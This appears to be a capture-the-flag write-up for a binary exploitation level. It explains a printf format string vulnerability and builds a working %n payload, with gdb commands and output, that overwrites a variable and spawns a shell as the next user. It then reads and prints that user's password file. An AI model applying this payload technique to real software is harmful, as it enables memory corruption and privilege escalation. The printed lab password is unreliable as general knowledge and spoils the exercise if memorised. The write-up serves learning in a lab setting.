### Download binary
``scp -P4242 level3@192.168.31.170:/home/user/level3/level3 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)
``fgets`` is size protected to prevent buffer overflow, buffer's size is 520, the limit is set to 512.
A printf() is called directly with our input, without string format, with research we find that we can exploit this, it's called **format string vulnerability**.
Some option of printf (%x, %n) can be used to dump the content of the stack or even to write anywhere anything in the memory.
The other thing that we find is that **if we put the number 64 inside the variable m, we get our flag**.

----

### Building the payload

``gdb ./level3``
``(gdb) run``
>Starting program: /home/user/level3/level3

We start it simple, here is our first payload, to find where our input is stocked in the stack :

``AAAA.%x.%x.%x.%x``

It simply print 4 A and then print the content of 4 adresses on top of the stack. And we got this output :

>AAAA.200.b7fd1ac0.b7ff37d0.41414141

The first argument is our 4 A and after that we got 200 (a number that is used in the program early on) then 2 adresses and then 41414141, interstingly enough 41 is the hexa representation of A.
**We conclude that this fourth argument is the pointer to our first string.**

The next step is to find the adress of m, as usual with gdb.

``(gdb) info variable``
>All defined variables:
[...]
0x0804988c  m

After that we will build this payload :

**M ADRESS + FILLING CHAR + MEMORY OF M IN STACK + %n**

Let explain it a little bit.
The first block is the adress of m that we just find.
After that theres is filling chars.
And finaly we use the %n to put the number of char that we've allready printed to an address, in this case the fourth adress on the stack, the one that stored 41414141.
Because we write the adress of m in the begining of our string, this will write 64 (the number of char we printed = 4 for adress + 60 filling char) inside m.

The payload is :
``python -c "print '\x8c\x98\x04\x08' + 'a'*60 + '%4\$n'" > /tmp/payload``

----

#### Getting the flag

``cat /tmp/payload - | ./level3``
>�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!

``whoami``
>level4

``cat /home/user/level4/.pass``
>b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
